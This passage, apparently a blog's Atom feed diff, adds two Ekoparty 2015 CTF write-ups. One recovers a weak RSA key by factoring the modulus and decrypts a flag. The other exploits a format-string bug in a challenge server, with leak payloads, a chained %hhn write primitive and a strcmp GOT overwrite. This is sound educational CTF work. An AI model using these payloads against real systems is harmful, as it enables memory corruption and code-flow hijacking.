@@ -4,7 +4,7 @@
   <title><![CDATA[staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-08-18T21:42:50+02:00</updated>
+  <updated>2015-09-21T23:59:38+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,1091 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Ekoparty - Cry100]]></title>
+    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100/"/>
+    <updated>2015-09-21T23:54:27+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100</id>
+    <content type="html"><![CDATA[<p>We&rsquo;re given a public key and a encrypted flag, with the task to get the private key. I&rsquo;m not very good at crypto challenges so I wanted to see if I could break this one and learn something in the process.</p>
+
+<!--more-->
+
+
+<p>The public key is an RSA key:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl rsa -inform PEM -pubin -in public.key -text -noout
+</span><span class='line'>Public-Key: <span class="o">(</span><span class="m">2070</span> bit<span class="o">)</span>
+</span><span class='line'>Modulus:
+</span><span class='line'>    25:b1:8b:f5:f3:89:09:7d:17:23:78:66:bb:51:cf:
+</span><span class='line'>    f8:de:92:24:53:74:9e:bc:40:3b:09:95:c9:7c:0e:
+</span><span class='line'>    38:6d:46:c1:61:ca:df:f7:7c:69:86:0d:ae:47:91:
+</span><span class='line'>    c2:14:cf:84:87:aa:aa:9f:26:e9:20:a9:77:83:49:
+</span><span class='line'>    06:03:8a:ef:b5:c3:08:27:df:cf:3f:c9:e9:76:95:
+</span><span class='line'>    44:f9:4e:07:cd:fe:08:72:03:9a:3a:62:62:11:66:
+</span><span class='line'>    78:b2:61:fb:2d:6b:9d:32:53:9e:92:a1:53:b3:67:
+</span><span class='line'>    56:29:ba:b3:94:2e:7d:35:e3:0f:7e:ef:5a:bf:1c:
+</span><span class='line'>    50:d7:97:d0:cc:88:e1:bd:cc:fd:1a:12:ea:6f:7e:
+</span><span class='line'>    f7:5c:37:27:db:df:2e:78:0f:34:28:ae:8f:7a:4f:
+</span><span class='line'>    b7:a8:9f:18:4a:36:50:32:b1:53:f8:42:5e:84:57:
+</span><span class='line'>    50:eb:2b:7a:bc:02:dc:15:ce:02:07:50:7a:a9:50:
+</span><span class='line'>    86:3b:b8:48:0a:78:02:8d:d6:29:79:94:4d:6c:63:
+</span><span class='line'>    3f:af:a1:03:e4:db:28:ce:87:f5:a0:c6:ed:4a:2f:
+</span><span class='line'>    26:64:42:7f:56:5c:77:81:ab:61:91:45:6d:97:1c:
+</span><span class='line'>    7f:fa:39:52:72:37:4c:ec:01:55:e5:f9:11:89:db:
+</span><span class='line'>    74:2e:4c:28:b0:3a:0f:a1:1c:ff:b0:31:73:d2:a4:
+</span><span class='line'>    cc:e6:ae:53
+</span><span class='line'>Exponent: <span class="m">65537</span> <span class="o">(</span>0x10001<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It has a rather weird number of bits, not a multiple of 256. The modulus is converted to hex using python and yields:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">n</span> <span class="o">=</span> 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hmm. Since the modulus <code>n</code> is made from the product of two primes, we&rsquo;d better find those primes. Luckily, I found another <a href="http://hacktracking.blogspot.nl/2013/11/cscamp-ctf-quals-2k13-crypto-public-is.html">writeup</a> and a website called <a href="http://factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443">factordb.com</a>. Factordb does <em>exactly</em> what it says on the box and yields two factors, <code>3133337</code> and another large number. The first number made me think I was on the right way!</p>
+
+<p>Now, we need to reconstruct the key. We have <code>n</code>, <code>p</code> and <code>q</code> which is all we need. I couldn&rsquo;t decrypt the message in Python, as Python&rsquo;s cryptolib requires the modulus to be a multiple of 256 bits. So I resorted to the voodoo magic that is <code>openssl</code>. I found this nice post on stackoverflow <a href="https://stackoverflow.com/questions/19850283/how-to-generate-rsa-keys-using-specific-input-numbers-in-openssl">about creating specific rsa keys</a>.</p>
+
+<p>I followed that post, computing:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>d mod<span class="o">(</span>p-1<span class="o">)</span> <span class="o">=</span> e1
+</span><span class='line'>d mod<span class="o">(</span>q-1<span class="o">)</span> <span class="o">=</span> e2
+</span><span class='line'>q^-1 mod <span class="nv">p</span> <span class="o">=</span> coeff
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>for which I needed</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I put everything in a file called <code>newkey.der</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">asn1</span><span class="o">=</span><span class="n">SEQUENCE</span><span class="p">:</span><span class="n">rsa_key</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">[</span><span class="n">rsa_key</span><span class="p">]</span>
+</span><span class='line'><span class="n">version</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">0</span>
+</span><span class='line'><span class="n">modulus</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span>
+</span><span class='line'><span class="n">pubExp</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">65537</span>  
+</span><span class='line'><span class="n">privExp</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">406853230956379689450620815713768871010712825839536410687962650677800895818003893712259622281477453292088146173840036827322518131453630576229976208523593618949818777897059256426591560532784635697190752924923710375949616954069804342573867253630978123632384795587951365482103468722384133084798614863870775897915929475258974188300927376911833763105616386167881813301748585233563049693794370642976326692672223638908164822104832415788577945314264232531947860576966629150456995512932232264881080618006698700677529111454508900582785420549466798020451488168615035256292977390692401388790460066327347700109341639992159475755036449</span>
+</span><span class='line'><span class="n">p</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span>
+</span><span class='line'><span class="n">q</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">3133337</span>
+</span><span class='line'><span class="n">e1</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">15320351458978192768467039741691432413958180349660930794740289485182452764579534136107456333762920952821710744567765011085892394594373698903583015958298729593743757394184665648601970820474550408544396720336394444082148339685815042712020243239641617201526913490150693257135882730015443734409342942381805505660243891614007699009146733904940642377373537806159587666380328759209553248526202577679304907571591265191240376778645354498599063176881375334380848007142765855272411310242667619720799140338871500103278100940728801960485534826631133256077779493381175185896255651752489800973249824932460228998596930117032675866465</span>
+</span><span class='line'><span class="n">e2</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">817841</span>
+</span><span class='line'><span class="n">coeff</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">0</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>privExp</code> was calculated like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">gmpy</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+</span><span class='line'>      
+</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="mi">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span>
+</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="mi">3133337</span>
+</span><span class='line'><span class="n">totien</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">totien</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">d</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then ran <code>$ openssl asn1parse -genconf  newkey.der -out key.der</code>. After mucking around with the flag, I verified I had the right private key by encrypting a test message with the public key. I noticed that the flag was base64 encoded whereas my encrypted message wasn&rsquo;t&hellip;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat flag.enc <span class="p">|</span>base64 -d &gt; test.enc
+</span><span class='line'><span class="nv">$ </span>openssl rsautl -in test.enc -out /dev/tty -inkey private.key -decrypt -oaep
+</span><span class='line'>EKO<span class="o">{</span>classic_rsa_challenge_is_boring_but_necessary<span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That last <code>openssl</code> command was just tested with <code>-raw</code> and -<code>oaep</code> (options for padding). <code>-oaep</code> worked!</p>
+
+<p>Flag was <code>EKO{classic_rsa_challenge_is_boring_but_necessary}</code>. I learned something \o/</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
+    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
+    <updated>2015-09-21T23:47:44+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
+    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>
+
+<!--more-->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc challs.ctf.site 20002
+</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
+</span><span class='line'>[!] Type bye to quit
+</span><span class='line'>Enter your name: %17$s
+</span><span class='line'>Hi 3k0_p4rty_2015!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>
+
+<p>bAAAA%8$x</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc challs.ctf.site 20002
+</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
+</span><span class='line'>[!] Type bye to quit
+</span><span class='line'>Enter your name: bAAAA%8$x
+</span><span class='line'>Hi bAAAA41414141</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
+</span><span class='line'>7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
+</span><span class='line'>disassemble error at offset 162
+</span><span class='line'>jnz 0x1337087a
+</span><span class='line'>mov dword [esp+0x4], 0x13370a97
+</span><span class='line'>lea eax, [ebp-0x19]
+</span><span class='line'>mov [esp], eax
+</span><span class='line'>call dword 0x133704e0
+</span><span class='line'>test eax, eax
+</span><span class='line'>jz 0x13370892
+</span><span class='line'>lea eax, [ebp-0x19]
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x13370a9a ; 
+</span><span class='line'>call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
+</span><span class='line'>jmp dword 0x3d613337
+</span><span class='line'>mov dword [esp], 0x13370aa2 ; Hi
+</span><span class='line'>call dword 0x13370510
+</span><span class='line'>lea eax, [ebp-0x19]
+</span><span class='line'>mov [esp], eax
+</span><span class='line'>call dword 0x13370510
+</span><span class='line'>mov dword [esp], 0x13370aa6
+</span><span class='line'>call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
+</span><span class='line'>lea eax, [ebp-0x19]
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
+</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
+</span><span class='line'>test eax, eax
+</span><span class='line'>jnz 0x13370932
+</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
+</span><span class='line'>call dword 0x13370510       ; puts?
+</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
+</span><span class='line'>call dword 0x133706dd       ; see below
+</span><span class='line'>mov [ebp-0x24], eax
+</span><span class='line'>mov eax, [0x13372108]
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56
+</span><span class='line'>or al, 0xd8
+</span><span class='line'>std
+</span><span class='line'>invalid</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>
+
+<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>
+
+<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>
+
+<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>
+
+<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>
+
+<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>
+
+<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>
+
+<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%32c%61$hhn (write 0x20 to 0xfffff1a0). </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, we update the pointer at $61 by writing to $25:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%161c%25$hhn</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%176c%61$hhn (write 0xb0 to 0xfffff1a1). </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%65c%124$hhn</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>
+
+<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
+</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
+</span><span class='line'>test eax, eax
+</span><span class='line'>jnz 0x13370932
+</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
+</span><span class='line'>call dword 0x13370510       ; puts?
+</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
+</span><span class='line'>call dword 0x133706dd       ; see below
+</span><span class='line'>mov [ebp-0x24], eax
+</span><span class='line'>mov eax, [0x13372108]
+</span><span class='line'>mov [esp+0x4], eax
+</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>
+
+<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>movzx ecx, byte [eax+0x5]
+</span><span class='line'>movzx eax, byte [edx+0x5]
+</span><span class='line'>sub eax, ecx
+</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>OMG! nice work, your flag is: EKO{</span></code></pre></td></tr></table></div></figure>
+
+
